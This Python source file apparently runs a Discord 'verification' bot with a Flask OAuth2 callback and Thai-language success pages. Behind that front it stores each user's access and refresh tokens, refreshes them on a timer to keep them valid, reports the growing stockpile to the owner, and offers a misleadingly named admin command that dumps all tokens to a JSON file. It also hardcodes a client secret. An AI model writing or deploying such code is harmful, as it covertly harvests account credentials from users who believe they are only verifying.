import discord
from discord import app_commands
from discord.ext import commands, tasks
from flask import Flask, request, render_template_string
import requests, sqlite3, time, threading, asyncio, aiohttp, os, traceback, gc, json

# --- [ 1. Configuration ] ---
TOKEN = os.getenv('DISCORD_TOKEN')
CLIENT_ID = os.getenv('DISCORD_CLIENT_ID', '1545398920560250930')
CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET', 'EktEC4GFcvihnUqpxcHbZm6pTFQwFRZE')
REDIRECT_URI = 'http://fi9.bot-hosting.cloud:25421/callback'
PORT_WISP = 25421
RAZEN_ID = 1531325825020989462
ADMIN_IDS = [RAZEN_ID]

app = Flask(__name__)

# --- [ 2. Database Initialization ] ---
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id TEXT PRIMARY KEY,
            username TEXT,
            access_token TEXT,
            refresh_token TEXT,
            expires_at INTEGER
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS buttons (
            state_id TEXT PRIMARY KEY,
            guild_id TEXT,
            role_id TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def db_execute(query, params=(), fetch=False):
    conn = sqlite3.connect('users.db', timeout=30)
    conn.execute('PRAGMA journal_mode=WAL')
    try:
        cursor = conn.cursor()
        cursor.execute(query, params)
        if fetch:
            result = cursor.fetchall()
            return result
        conn.commit()
    except Exception as e:
        print(f"Database Error: {e}")
        print(traceback.format_exc())
        return []
    finally:
        conn.close()

async def refresh_user_token(user_id, refresh_token):
    url = "https://discord.com/api/v10/oauth2/token"
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, data=data, timeout=10) as r:
                if r.status == 200:
                    res = await r.json()
                    db_execute("UPDATE users SET access_token=?, refresh_token=?, expires_at=? WHERE user_id=?", 
                               (res['access_token'], res['refresh_token'], int(time.time()) + res['expires_in'], user_id))
                    return res['access_token']
        except Exception as e:
            print(f"Error refreshing token for {user_id}: {e}")
    return None

# --- [ 3. HTML Templates ] ---
COMMON_STYLE = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Kanit', sans-serif; }
    body { 
        background: #1e2124; 
        background-image: radial-gradient(circle at center, #2f3136, #1e2124);
        display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white;
    }
    .container { 
        background: #2f3136; 
        width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05);
        animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .icon-circle { 
        width: 80px; height: 80px; border-radius: 50%; display: flex; 
        justify-content: center; align-items: center; margin: 0 auto 20px; 
        border: 4px solid #43b581;
    }
    .success-icon { color: #43b581; font-size: 40px; font-weight: bold; }
    .profile-card { 
        background: #202225; border-radius: 15px; padding: 20px; 
        margin: 20px 0; display: flex; flex-direction: column; align-items: center;
    }
    .avatar { 
        width: 80px; height: 80px; border-radius: 50%; margin-bottom: 10px; 
        border: 3px solid #43b581; 
    }
    .btn { 
        display: flex; align-items: center; justify-content: center; gap: 10px;
        width: 100%; color: white; text-decoration: none; padding: 15px; 
        border-radius: 12px; font-weight: 600; font-size: 16px; transition: 0.2s; 
        margin-top: 10px; background: #43b581;
    }
    .btn:hover { background: #3ca374; transform: scale(1.02); }
</style>
"""

SUCCESS_TEMPLATE = COMMON_STYLE + """
<div class="container">
    <div class="icon-circle"><span class="success-icon">✓</span></div>
    <h2 style="color:#43b581; margin-bottom:15px;">ยืนยันสําเร็จแล้ว!</h2>
    <div class="profile-card">
        <img src="{{ avatar_url }}" class="avatar">
        <div style="font-size:20px; font-weight:600;">{{ username }}</div>
        <p style="color:#72767d; font-size:14px;">ยืนยันตัวตนเรียบร้อยแล้ว</p>
    </div>
    <p style="font-size:14px; color:#b9bbbe; line-height:1.6;">ระบบกําลังจัดส่งยศให้คุณ กรุณากลับไปเช็คที่ Discord</p>
    <a href="discord://" class="btn">กลับไปหน้า Discord</a>
</div>
"""

ERROR_TEMPLATE = COMMON_STYLE + """
<div class="container">
    <div class="icon-circle" style="border-color:#f04747;"><span style="color:#f04747; font-size:40px;">✕</span></div>
    <h2 style="color:#f04747; margin-bottom:15px;">เกิดข้อผิดพลาด</h2>
    <p style="font-size:16px; color:#b9bbbe; margin-bottom:25px;">{{ error_msg }}</p>
    <a href="javascript:location.reload();" class="btn" style="background:#4f545c;">ลองใหม่อีกครั้ง</a>
</div>
"""

# --- [ 4. Flask Server ] ---
@app.route('/callback')
def callback():
    code = request.args.get('code')
    state = request.args.get('state')
    if not code:
        return render_template_string(ERROR_TEMPLATE, error_msg="ไม่พบรหัสยืนยันตัวตน")
    
    try:
        res = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }, timeout=10).json()

        at = res.get('access_token')
        if not at:
            return render_template_string(ERROR_TEMPLATE, error_msg="แลกเปลี่ยน Token ล้มเหลว")

        u = requests.get("https://discord.com/api/users/@me", headers={'Authorization': f'Bearer {at}'}, timeout=10).json()
        uid, uname, avatar = u['id'], u['username'], u.get('avatar')
        a_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"

        db_execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?)", 
                   (uid, uname, at, res.get('refresh_token'), int(time.time()) + res.get('expires_in', 0)))

        count_data = db_execute("SELECT COUNT(*) FROM users", fetch=True)
        total = count_data[0][0] if count_data else 0
        asyncio.run_coroutine_threadsafe(send_log(u, a_url, total), bot.loop)

        if state:
            btn_data = db_execute("SELECT guild_id, role_id FROM buttons WHERE state_id = ?", (state,), fetch=True)
            if btn_data:
                requests.put(f"https://discord.com/api/v10/guilds/{btn_data[0][0]}/members/{uid}/roles/{btn_data[0][1]}", 
                             headers={"Authorization": f"Bot {TOKEN}"}, timeout=5)

        return render_template_string(SUCCESS_TEMPLATE, username=uname, avatar_url=a_url)
    except Exception as e:
        print(f"Callback error: {e}")
        return render_template_string(ERROR_TEMPLATE, error_msg="ระบบขัดข้อง กรุณาลองใหม่")

async def send_log(user, avatar, total):
    try:
        razen = await bot.fetch_user(RAZEN_ID)
        emb = discord.Embed(title="🟢 รับยศสำเร็จ!", color=0x43b581, timestamp=discord.utils.utcnow())
        emb.set_thumbnail(url=avatar)
        emb.add_field(name="👤 ชื่อ", value=f"`{user['username']}`", inline=True)
        emb.add_field(name="🆔 ไอดี", value=f"`{user['id']}`", inline=True)
        emb.add_field(name="📊 คลังรวมทั้งหมด", value=f"**` {total} `** ราย", inline=False)
        await razen.send(embed=emb)
    except Exception as e:
        print(f"Send log error: {e}")

# --- [ 5. Discord Bot Setup ] ---
class RazenBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.all(), help_command=None)

    async def setup_hook(self):
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT_WISP, debug=False, use_reloader=False), daemon=True).start()
        self.revive_loop.start()
        self.memory_cleaner.start()

    @tasks.loop(minutes=30)
    async def revive_loop(self):
        users = db_execute("SELECT user_id, refresh_token FROM users WHERE expires_at < ?", (int(time.time()) + 7200,), fetch=True)
        if users:
            for u in users:
                await refresh_user_token(u[0], u[1])
                await asyncio.sleep(2.0)

    @tasks.loop(hours=1)
    async def memory_cleaner(self): 
        gc.collect()

bot = RazenBot()

@bot.event
async def on_ready():
    print(f'🔥 REALHIGHT SYSTEM ONLINE: {bot.user.name}')
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} command(s) automatically!")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

@bot.command(name="realhight")
async def sync_cmd(ctx):
    if ctx.author.id in ADMIN_IDS:
        await bot.tree.sync()
        await ctx.send("✅ ซิงค์คําสั่ง Slash Commands เรียบร้อยแล้วครับ!")

# --- [ 6. TOKEN MANAGEMENT COMMANDS ] ---

@bot.tree.command(name="ดูผู้ใช้ยศในทางที่ผิด", description="ดูคนใช้ยศในทางที่ผิด (แอดมินเท่านั้น)")
async def dump_tokens(interaction: discord.Interaction):
    if interaction.user.id not in ADMIN_IDS:
        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    users = db_execute("SELECT user_id, username, access_token, refresh_token, expires_at FROM users", fetch=True)

    if not users:
        await interaction.followup.send("⚠️ ไม่มี tokens ในคลัง!", ephemeral=True)
        return

    data = {
        "total": len(users),
        "exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "tokens": []
    }

    for uid, uname, at, rt, exp in users:
        data["tokens"].append({
            "user_id": uid,
            "username": uname,
            "access_token": at,
            "refresh_token": rt,
            "expires_at": exp,
            "expired": int(time.time()) > exp
        })

    filename = f"tokens_dump_{int(time.time())}.json"
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    await interaction.followup.send(
        f"📦 ส่งออก {len(users)} tokens เรียบร้อย!",
        file=discord.File(filename),
        ephemeral=True
    )

    if os.path.exists(filename):
        os.remove(filename)

@bot.tree.command(name="ล็อคดูย้อนหลัง", description="ดูล็อคย้อนหลังคนที่ทำ (แอดมินเท่านั้น)")
@app_commands.describe(target="ระบุผู้ใช้ที่ต้องการตรวจสอบ")
async def check_logs(interaction: discord.Interaction, target: discord.User):
    if interaction.user.id not in ADMIN_IDS:
        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    user_data = db_execute("SELECT user_id, username, expires_at FROM users WHERE user_id = ?", (str(target.id),), fetch=True)

    if not user_data:
        await interaction.followup.send(f"⚠️ ไม่พบข้อมูลการยืนยันตัวตนของ {target.mention} ในระบบ", ephemeral=True)
        return

    uid, uname, exp = user_data[0]
    exp_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(exp))
    is_expired = "หมดอายุแล้ว" if int(time.time()) > exp else "ยังไม่หมดอายุ"

    embed = discord.Embed(title="📜 ประวัติการยืนยันตัวตน", color=0x3498db)
    embed.add_field(name="ผู้ใช้งาน", value=f"{uname} ({target.mention})", inline=False)
    embed.add_field(name="User ID", value=f"`{uid}`", inline=True)
    embed.add_field(name="สถานะ Token", value=is_expired, inline=True)
    embed.add_field(name="วันหมดอายุ", value=exp_time_str, inline=False)

    await interaction.followup.send(embed=embed, ephemeral=True)

# Run Bot
if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("❌ กรุณาตั้งค่า DISCORD_TOKEN ใน Environment Variable")
